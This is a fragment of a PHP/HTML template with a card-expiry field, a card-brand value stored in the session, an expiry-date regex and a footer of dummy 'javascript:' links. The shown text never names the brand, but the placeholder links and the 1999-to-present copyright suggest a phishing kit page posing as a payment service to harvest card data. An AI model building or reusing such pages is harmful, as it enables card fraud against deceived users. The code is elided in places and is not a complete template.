			...
			<div class="fields clearfix">
				...
				<div class="multiInputs">
					<div class="inputArea hasSub">
						<input id="cex" type="tel" required placeholder="<?php echo $lg_process['exp']?>" maxlength="5" autocomplete="off">
					</div>
...
<div>
	<div class="ftr"><div class="footerFirstContent"><ul class="footerList"><li><a href="javascript:"><?php echo $lg_sign['footer']['contact']?></a></li><li><a href="javascript:"><?php echo $lg_process['footer']['security']?></a></li></ul><div class="footerSecondContent"><p class="footerP">Copyright ©<span>1999-<?=date('Y');?></span> . <?php echo $lg_process['footer']['rights']?></p><ul class="footerUl"><li><a href="javascript:"><?php echo $lg_sign['footer']['privacy']?></a></li><li><a href="javascript:"><?php echo $lg_sign['footer']['legal']?></a></li></ul></div></div></div></div></div>
	
	<?php
	if(isset($_POST["cctypeos"])){
	$_SESSION["_cc_brand_"] = $_POST["cctypeos"];
	}
	?>
	<script>
		...
		function validExp(b){var a=new RegExp("(([0][1-9]{1})|([1][0-2]{1}))/(([2][2-9]{1})|([3][0-9]{1}))");
		return a.test(b);
	}
